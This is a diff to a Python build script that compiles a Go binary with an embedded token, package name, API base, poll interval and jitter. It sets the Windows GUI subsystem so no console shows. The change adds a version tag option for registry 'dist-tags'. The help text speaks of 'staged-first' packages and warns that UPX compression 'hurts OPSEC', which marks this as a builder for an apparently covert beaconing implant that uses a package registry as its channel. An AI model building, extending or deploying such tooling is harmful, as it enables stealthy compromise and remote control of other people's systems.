@@ -70,7 +70,7 @@ def pack_upx(path):
 
 def build(token=None, package=None, api_base=None, arch_key="amd64",
           outdir=None, name="node", strip=True, interval=60, jitter=20,
-          upx=False):
+          upx=False, tag_value="1.0.0"):
     if token and not package:
         raise SystemExit("--package is required with --token")
 
@@ -94,6 +94,7 @@ def build(token=None, package=None, api_base=None, arch_key="amd64",
         "-X", f"main.embeddedPkg={package or ''}",
         "-X", f"main.embeddedEvery={int(interval)}",
         "-X", f"main.embeddedJit={int(jitter)}",
+        "-X", f"main.tagValue={tag_value}",
         "-H", "windowsgui",
     ]
     if strip:
@@ -136,6 +137,9 @@ def main():
                     help="poll interval baked into the binary (default 60)")
     ap.add_argument("--jitter", type=int, default=20,
                     help="jitter baked into the binary (default 20)")
+    ap.add_argument("--tag-value", default="1.0.0",
+                    help="version the dist-tags point at; must exist in the "
+                         "package (staged-first packages use 0.0.0-stage)")
     ap.add_argument("--upx", action="store_true",
                     help="compress with UPX (~31%% of the size; hurts OPSEC)")
     ap.add_argument("--32", dest="x86", action="store_true", help="also build 386")
@@ -144,11 +148,12 @@ def main():
     if not a.package:
         raise SystemExit("--package/-p is required: the binary carries it")
     build(a.token, a.package, a.api_base, "amd64", a.outdir, a.name,
-          strip=not a.no_strip, interval=a.interval, jitter=a.jitter, upx=a.upx)
+          strip=not a.no_strip, interval=a.interval, jitter=a.jitter, upx=a.upx,
+          tag_value=a.tag_value)
     if a.x86:
         build(a.token, a.package, a.api_base, "386", a.outdir, a.name,
               strip=not a.no_strip, interval=a.interval, jitter=a.jitter,
-              upx=a.upx)
+              upx=a.upx, tag_value=a.tag_value)
 
 
 if __name__ == "__main__":
